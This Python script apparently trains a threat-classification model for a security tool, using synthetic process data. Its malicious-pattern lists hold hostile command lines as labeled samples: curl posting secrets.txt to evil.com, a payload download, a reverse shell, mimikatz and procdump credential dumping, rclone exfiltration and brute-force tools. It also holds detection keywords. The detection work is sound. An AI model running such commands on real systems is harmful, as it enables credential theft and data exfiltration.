#!/usr/bin/env python3
"""
FortifAI ML Model Training & Deployment
========================================

This script provides an easy way to:
1. Train ML models with synthetic or real data
2. Deploy trained models to the ML engine
3. Test model accuracy

USAGE:
------
# Quick start - train and deploy immediately
python scripts/train_and_deploy.py --quick-start

# Train with more data for better accuracy
python scripts/train_and_deploy.py --train --samples 20000

# Deploy models to ML engine
python scripts/train_and_deploy.py --deploy

# Test current model accuracy
python scripts/train_and_deploy.py --test
"""

import os
import sys
import json
import random
import shutil
import argparse
import pickle
from pathlib import Path
from datetime import datetime, timedelta

import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import LabelEncoder, StandardScaler
from sklearn.metrics import classification_report, confusion_matrix
import joblib

# Paths
PROJECT_ROOT = Path(__file__).parent.parent
MODELS_DIR = PROJECT_ROOT / 'ml-models' / 'threat-classification'
TRAINED_DIR = MODELS_DIR / 'trained'
DATA_DIR = PROJECT_ROOT / 'ml-models' / 'training-data'


class TrainingDataGenerator:
    """Generate realistic labeled training data"""
    
    def __init__(self):
        self.threat_categories = [
            'normal', 'malware', 'ransomware', 'trojan',
            'ddos', 'brute_force', 'data_exfiltration', 'privilege_escalation'
        ]
        
        # NORMAL processes - should never trigger alerts
        self.normal_processes = [
            # Windows System
            {'name': 'System', 'cpu': (0, 5), 'mem': (0, 0.5)},
            {'name': 'System Idle Process', 'cpu': (80, 99), 'mem': (0, 0.1)},
            {'name': 'svchost.exe', 'cpu': (0, 15), 'mem': (0.1, 3)},
            {'name': 'csrss.exe', 'cpu': (0, 3), 'mem': (0.1, 1)},
            {'name': 'lsass.exe', 'cpu': (0, 5), 'mem': (0.1, 2)},
            {'name': 'services.exe', 'cpu': (0, 2), 'mem': (0.1, 1)},
            {'name': 'explorer.exe', 'cpu': (0, 10), 'mem': (1, 5)},
            {'name': 'dwm.exe', 'cpu': (0, 25), 'mem': (1, 10)},
            {'name': 'SearchIndexer.exe', 'cpu': (0, 30), 'mem': (1, 5)},
            {'name': 'MsMpEng.exe', 'cpu': (0, 80), 'mem': (2, 10)},  # Windows Defender
            
            # Browsers (high CPU/memory is NORMAL)
            {'name': 'chrome.exe', 'cpu': (0, 70), 'mem': (2, 30)},
            {'name': 'firefox.exe', 'cpu': (0, 60), 'mem': (2, 25)},
            {'name': 'msedge.exe', 'cpu': (0, 60), 'mem': (2, 25)},
            
            # Development Tools (100% CPU during builds is NORMAL)
            {'name': 'Code.exe', 'cpu': (0, 50), 'mem': (2, 18)},
            {'name': 'python.exe', 'cpu': (0, 100), 'mem': (0.5, 30)},
            {'name': 'python3.exe', 'cpu': (0, 100), 'mem': (0.5, 30)},
            {'name': 'node.exe', 'cpu': (0, 100), 'mem': (1, 25)},
            {'name': 'java.exe', 'cpu': (0, 100), 'mem': (5, 35)},
            {'name': 'devenv.exe', 'cpu': (0, 70), 'mem': (5, 25)},
            
            # Docker & Containers
            {'name': 'docker.exe', 'cpu': (0, 50), 'mem': (1, 10)},
            {'name': 'Docker Desktop.exe', 'cpu': (0, 40), 'mem': (2, 15)},
            {'name': 'wsl.exe', 'cpu': (0, 50), 'mem': (1, 10)},
            
            # Shells (developers use these legitimately)
            {'name': 'bash.exe', 'cpu': (0, 60), 'mem': (0.5, 5)},
            {'name': 'powershell.exe', 'cpu': (0, 60), 'mem': (1, 12)},
            {'name': 'cmd.exe', 'cpu': (0, 30), 'mem': (0.1, 3)},
            {'name': 'WindowsTerminal.exe', 'cpu': (0, 25), 'mem': (1, 10)},
            
            # Build Tools
            {'name': 'npm.exe', 'cpu': (0, 100), 'mem': (1, 18)},
            {'name': 'tsc.exe', 'cpu': (0, 100), 'mem': (1, 12)},
            {'name': 'webpack.exe', 'cpu': (0, 100), 'mem': (2, 18)},
            {'name': 'MSBuild.exe', 'cpu': (0, 100), 'mem': (2, 18)},
            {'name': 'git.exe', 'cpu': (0, 50), 'mem': (0.5, 5)},
            
            # Office & Communication
            {'name': 'OUTLOOK.EXE', 'cpu': (0, 30), 'mem': (2, 15)},
            {'name': 'Teams.exe', 'cpu': (0, 35), 'mem': (3, 20)},
            {'name': 'Slack.exe', 'cpu': (0, 25), 'mem': (2, 15)},
            {'name': 'Discord.exe', 'cpu': (0, 25), 'mem': (2, 15)},
        ]
        
        # MALICIOUS patterns - should ALWAYS trigger alerts
        self.malicious_patterns = {
            'malware': [
                {'name': 'mimikatz.exe', 'cmd': 'mimikatz.exe sekurlsa::logonpasswords', 'cpu': (30, 70)},
                {'name': 'mimikatz.exe', 'cmd': 'mimikatz.exe lsadump::sam', 'cpu': (20, 60)},
                {'name': 'svchosts.exe', 'cmd': 'svchosts.exe -connect evil.com', 'cpu': (10, 50)},  # Typo = suspicious
                {'name': 'scvhost.exe', 'cmd': 'scvhost.exe', 'cpu': (10, 40)},
                {'name': 'payload.exe', 'cmd': 'payload.exe --silent', 'cpu': (20, 80)},
                {'name': 'backdoor.exe', 'cmd': 'backdoor.exe --persist', 'cpu': (5, 30)},
            ],
            'ransomware': [
                {'name': 'encrypt.exe', 'cmd': 'encrypt.exe --recursive C:\\Users', 'cpu': (60, 100)},
                {'name': 'locker.exe', 'cmd': 'locker.exe --wallet bc1qxy...', 'cpu': (50, 90)},
                {'name': 'cryptor.exe', 'cmd': 'cryptor.exe -aes256 -all', 'cpu': (70, 100)},
                {'name': 'ransom.exe', 'cmd': 'ransom.exe --encrypt --payment', 'cpu': (60, 95)},
            ],
            'trojan': [
                {'name': 'svchost.exe', 'cmd': 'svchost.exe -connect 185.141.62.123:443', 'cpu': (5, 30), 'suspicious_conn': True},
                {'name': 'update.exe', 'cmd': 'update.exe --silent --download http://evil.com/payload', 'cpu': (10, 40)},
                {'name': 'helper.exe', 'cmd': 'helper.exe --reverse-shell 10.0.0.1:4444', 'cpu': (5, 25)},
                {'name': 'chrome_update.exe', 'cmd': 'chrome_update.exe --no-ui', 'cpu': (10, 35)},
            ],
            'ddos': [
                {'name': 'stress.exe', 'cmd': 'stress.exe --cpu 16 --flood', 'cpu': (90, 100), 'connections': (100, 1000)},
                {'name': 'hping.exe', 'cmd': 'hping.exe --flood -p 80 target.com', 'cpu': (80, 100), 'connections': (500, 5000)},
                {'name': 'loic.exe', 'cmd': 'loic.exe --target 192.168.1.1', 'cpu': (70, 95), 'connections': (200, 2000)},
            ],
            'brute_force': [
                {'name': 'hydra.exe', 'cmd': 'hydra.exe -l admin -P wordlist.txt ssh://target', 'cpu': (30, 70), 'connections': (50, 500)},
                {'name': 'medusa.exe', 'cmd': 'medusa.exe -h 10.0.0.1 -u admin -P passwords.txt', 'cpu': (25, 65)},
                {'name': 'john.exe', 'cmd': 'john.exe --wordlist=rockyou.txt hashes.txt', 'cpu': (80, 100)},
                {'name': 'hashcat.exe', 'cmd': 'hashcat.exe -m 1000 hash.txt wordlist.txt', 'cpu': (90, 100)},
            ],
            'data_exfiltration': [
                {'name': 'rclone.exe', 'cmd': 'rclone.exe copy C:\\Confidential remote:exfil', 'cpu': (20, 60)},
                {'name': 'curl.exe', 'cmd': 'curl.exe -X POST -d @secrets.txt http://evil.com', 'cpu': (5, 20)},
                {'name': 'ftp.exe', 'cmd': 'ftp.exe -s:script.txt evil-server.com', 'cpu': (10, 30)},
            ],
            'privilege_escalation': [
                {'name': 'winpeas.exe', 'cmd': 'winpeas.exe', 'cpu': (30, 70)},
                {'name': 'juicypotato.exe', 'cmd': 'juicypotato.exe -l 1337 -p cmd.exe', 'cpu': (20, 50)},
                {'name': 'printspoofer.exe', 'cmd': 'printspoofer.exe -i -c cmd', 'cpu': (15, 45)},
                {'name': 'powershell.exe', 'cmd': 'powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=', 'cpu': (20, 60)},
                {'name': 'psexec.exe', 'cmd': 'psexec.exe \\\\target -s cmd.exe', 'cpu': (10, 40)},
                {'name': 'procdump.exe', 'cmd': 'procdump.exe -ma lsass.exe lsass.dmp', 'cpu': (30, 60)},
            ],
        }
    
    def generate_normal_sample(self) -> dict:
        """Generate a NORMAL sample"""
        proc = random.choice(self.normal_processes)
        
        return {
            'process_name': proc['name'],
            'cmdline': proc['name'],
            'cpu_usage': random.uniform(*proc['cpu']),
            'memory_usage': random.uniform(*proc['mem']),
            'pid': random.randint(100, 65000),
            'ppid': random.randint(1, 10000),
            'has_network_activity': random.choice([0, 0, 0, 1]),
            'connection_count': random.randint(0, 15),
            'is_system_user': random.choice([0, 0, 1]),
            'label': 'normal'
        }
    
    def generate_malicious_sample(self, threat_type: str) -> dict:
        """Generate a MALICIOUS sample"""
        patterns = self.malicious_patterns.get(threat_type, [])
        pattern = random.choice(patterns) if patterns else {'name': 'malware.exe', 'cmd': 'malware.exe', 'cpu': (30, 80)}
        
        return {
            'process_name': pattern['name'],
            'cmdline': pattern['cmd'],
            'cpu_usage': random.uniform(*pattern.get('cpu', (30, 80))),
            'memory_usage': random.uniform(5, 30),
            'pid': random.randint(100, 65000),
            'ppid': random.randint(1, 10000),
            'has_network_activity': 1 if pattern.get('suspicious_conn') or pattern.get('connections') else random.choice([0, 1]),
            'connection_count': random.randint(*pattern.get('connections', (0, 20))) if pattern.get('connections') else random.randint(0, 20),
            'is_system_user': 0,
            'label': threat_type
        }
    
    def generate_dataset(self, n_samples: int = 10000) -> pd.DataFrame:
        """Generate balanced dataset (70% normal, 30% threats)"""
        samples = []
        
        n_normal = int(n_samples * 0.7)
        n_threats = n_samples - n_normal
        n_per_threat = n_threats // len(self.malicious_patterns)
        
        print(f"Generating {n_normal} normal samples...")
        for _ in range(n_normal):
            samples.append(self.generate_normal_sample())
        
        for threat_type in self.malicious_patterns.keys():
            print(f"Generating {n_per_threat} {threat_type} samples...")
            for _ in range(n_per_threat):
                samples.append(self.generate_malicious_sample(threat_type))
        
        random.shuffle(samples)
        df = pd.DataFrame(samples)
        
        print(f"\n✓ Generated {len(df)} samples")
        print(f"  Normal: {len(df[df['label'] == 'normal'])} ({100*len(df[df['label']=='normal'])/len(df):.1f}%)")
        print(f"  Threats: {len(df[df['label'] != 'normal'])} ({100*len(df[df['label']!='normal'])/len(df):.1f}%)")
        
        return df


def extract_features(row: dict) -> dict:
    """Extract ML features from a data point"""
    process_name = str(row.get('process_name', '')).lower()
    cmdline = str(row.get('cmdline', '')).lower()
    
    return {
        'cpu_usage': float(row.get('cpu_usage', 0) or 0),
        'memory_usage': float(row.get('memory_usage', 0) or 0),
        'process_name_length': len(process_name),
        'cmdline_length': len(cmdline),
        'has_args': 1 if ' ' in cmdline else 0,
        'is_system_user': int(row.get('is_system_user', 0) or 0),
        'has_network_activity': int(row.get('has_network_activity', 0) or 0),
        'connection_count': int(row.get('connection_count', 0) or 0),
        
        # Suspicious indicators
        'has_encoded_cmd': 1 if 'encodedcommand' in cmdline or '-enc' in cmdline else 0,
        'has_download_cmd': 1 if 'download' in cmdline or 'wget' in cmdline else 0,
        'has_connect_cmd': 1 if 'connect' in cmdline or 'reverse' in cmdline or 'shell' in cmdline else 0,
        'has_encrypt_cmd': 1 if 'encrypt' in cmdline or 'ransom' in cmdline else 0,
        
        # Known tools
        'is_mimikatz': 1 if 'mimikatz' in process_name or 'sekurlsa' in cmdline else 0,
        'is_psexec': 1 if 'psexec' in process_name else 0,
        'is_procdump': 1 if 'procdump' in process_name else 0,
        
        # Typosquatting
        'has_typo': 1 if process_name in ['svchosts.exe', 'scvhost.exe', 'csrs.exe', 'explore.exe'] else 0,
    }


def train_models(df: pd.DataFrame, output_dir: Path) -> dict:
    """Train and save ML models"""
    print("\n" + "="*60)
    print("TRAINING ML MODELS")
    print("="*60)
    
    # Extract features
    print("\nExtracting features...")
    features = [extract_features(row) for _, row in df.iterrows()]
    X = pd.DataFrame(features)
    
    # Encode labels
    le = LabelEncoder()
    y = le.fit_transform(df['label'])
    
    # Scale features
    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X)
    
    # Split
    X_train, X_test, y_train, y_test = train_test_split(
        X_scaled, y, test_size=0.2, random_state=42, stratify=y
    )
    
    print(f"Training: {len(X_train)} samples")
    print(f"Testing: {len(X_test)} samples")
    
    # Train Random Forest
    print("\nTraining Random Forest...")
    rf = RandomForestClassifier(
        n_estimators=200,
        max_depth=15,
        min_samples_split=5,
        class_weight='balanced',
        random_state=42,
        n_jobs=-1
    )
    rf.fit(X_train, y_train)
    rf_score = rf.score(X_test, y_test)
    print(f"  Accuracy: {rf_score:.4f}")
    
    # Train Gradient Boosting
    print("\nTraining Gradient Boosting...")
    gb = GradientBoostingClassifier(
        n_estimators=100,
        max_depth=8,
        learning_rate=0.1,
        random_state=42
    )
    gb.fit(X_train, y_train)
    gb_score = gb.score(X_test, y_test)
    print(f"  Accuracy: {gb_score:.4f}")
    
    # Classification report
    print("\n" + "="*60)
    print("CLASSIFICATION REPORT")
    print("="*60)
    y_pred = rf.predict(X_test)
    print(classification_report(y_test, y_pred, target_names=le.classes_))
    
    # Save models
    output_dir.mkdir(parents=True, exist_ok=True)
    
    joblib.dump(rf, output_dir / 'rf_model.joblib')
    joblib.dump(gb, output_dir / 'gb_model.joblib')
    joblib.dump(scaler, output_dir / 'scaler.joblib')
    joblib.dump(le, output_dir / 'label_encoder.joblib')
    
    # Save feature columns
    with open(output_dir / 'feature_columns.json', 'w') as f:
        json.dump(list(X.columns), f)
    
    # Save metadata
    metadata = {
        'trained_at': datetime.now().isoformat(),
        'samples': len(df),
        'rf_accuracy': float(rf_score),
        'gb_accuracy': float(gb_score),
        'classes': list(le.classes_),
        'feature_columns': list(X.columns)
    }
    with open(output_dir / 'model_metadata.json', 'w') as f:
        json.dump(metadata, f, indent=2)
    
    print(f"\n✓ Models saved to {output_dir}")
    
    return metadata


def deploy_models():
    """Deploy trained models to ML engine"""
    print("\n" + "="*60)
    print("DEPLOYING MODELS")
    print("="*60)
    
    source = TRAINED_DIR
    if not source.exists():
        print(f"✗ No trained models found at {source}")
        print("  Run with --train first")
        return False
    
    # Check required files
    required = ['rf_model.joblib', 'gb_model.joblib', 'scaler.joblib', 'label_encoder.joblib']
    missing = [f for f in required if not (source / f).exists()]
    
    if missing:
        print(f"✗ Missing model files: {missing}")
        return False
    
    # Read metadata
    metadata_file = source / 'model_metadata.json'
    if metadata_file.exists():
        with open(metadata_file) as f:
            metadata = json.load(f)
        print(f"  Model trained: {metadata.get('trained_at', 'unknown')}")
        print(f"  Accuracy: RF={metadata.get('rf_accuracy', 0):.2%}, GB={metadata.get('gb_accuracy', 0):.2%}")
    
    print(f"\n✓ Models ready at {source}")
    print("\nTo use trained models, restart ML engine:")
    print("  docker-compose restart ml-engine")
    
    return True


def test_model():
    """Test model with sample data"""
    print("\n" + "="*60)
    print("TESTING MODEL")
    print("="*60)
    
    source = TRAINED_DIR
    if not (source / 'rf_model.joblib').exists():
        print("✗ No trained model found. Run with --train first")
        return
    
    # Load models
    rf = joblib.load(source / 'rf_model.joblib')
    scaler = joblib.load(source / 'scaler.joblib')
    le = joblib.load(source / 'label_encoder.joblib')
    
    # Test samples
    test_cases = [
        {'name': 'chrome.exe (normal)', 'process_name': 'chrome.exe', 'cmdline': 'chrome.exe', 'cpu_usage': 45, 'memory_usage': 15, 'connection_count': 5},
        {'name': 'python.exe (normal)', 'process_name': 'python.exe', 'cmdline': 'python.exe script.py', 'cpu_usage': 95, 'memory_usage': 20, 'connection_count': 0},
        {'name': 'bash.exe (normal)', 'process_name': 'bash.exe', 'cmdline': 'bash.exe', 'cpu_usage': 50, 'memory_usage': 3, 'connection_count': 0},
        {'name': 'mimikatz.exe (malware)', 'process_name': 'mimikatz.exe', 'cmdline': 'mimikatz.exe sekurlsa::logonpasswords', 'cpu_usage': 40, 'memory_usage': 10, 'connection_count': 0},
        {'name': 'svchosts.exe (trojan)', 'process_name': 'svchosts.exe', 'cmdline': 'svchosts.exe -connect evil.com', 'cpu_usage': 30, 'memory_usage': 8, 'connection_count': 5},
        {'name': 'encrypt.exe (ransomware)', 'process_name': 'encrypt.exe', 'cmdline': 'encrypt.exe --recursive', 'cpu_usage': 80, 'memory_usage': 15, 'connection_count': 0},
    ]
    
    print("\nTest Results:")
    print("-" * 70)
    
    for test in test_cases:
        features = extract_features(test)
        X = pd.DataFrame([features])
        X_scaled = scaler.transform(X)
        
        pred = rf.predict(X_scaled)[0]
        proba = rf.predict_proba(X_scaled)[0]
        label = le.inverse_transform([pred])[0]
        confidence = max(proba)
        
        status = "✓" if ('normal' in test['name'] and label == 'normal') or ('normal' not in test['name'] and label != 'normal') else "✗"
        print(f"{status} {test['name']:<30} → {label:<20} ({confidence:.1%})")
    
    print("-" * 70)


def main():
    parser = argparse.ArgumentParser(description='FortifAI ML Model Training & Deployment')
    parser.add_argument('--quick-start', action='store_true', help='Train with default settings and deploy')
    parser.add_argument('--train', action='store_true', help='Train models')
    parser.add_argument('--samples', type=int, default=10000, help='Number of training samples')
    parser.add_argument('--deploy', action='store_true', help='Deploy trained models')
    parser.add_argument('--test', action='store_true', help='Test model accuracy')
    
    args = parser.parse_args()
    
    if args.quick_start:
        # Generate data
        generator = TrainingDataGenerator()
        df = generator.generate_dataset(args.samples)
        
        # Save data
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        df.to_csv(DATA_DIR / 'training_data.csv', index=False)
        
        # Train
        train_models(df, TRAINED_DIR)
        
        # Test
        test_model()
        
        # Deploy info
        deploy_models()
        
    elif args.train:
        generator = TrainingDataGenerator()
        df = generator.generate_dataset(args.samples)
        
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        df.to_csv(DATA_DIR / 'training_data.csv', index=False)
        
        train_models(df, TRAINED_DIR)
        test_model()
        
    elif args.deploy:
        deploy_models()
        
    elif args.test:
        test_model()
        
    else:
        parser.print_help()
        print("\n" + "="*60)
        print("QUICK START GUIDE")
        print("="*60)
        print("""
1. Train and deploy models (one command):
   python scripts/train_and_deploy.py --quick-start

2. Train with more data for better accuracy:
   python scripts/train_and_deploy.py --train --samples 50000

3. Test current model:
   python scripts/train_and_deploy.py --test

4. After training, restart ML engine:
   cd infrastructure/docker
   docker-compose restart ml-engine
""")


if __name__ == '__main__':
    main()
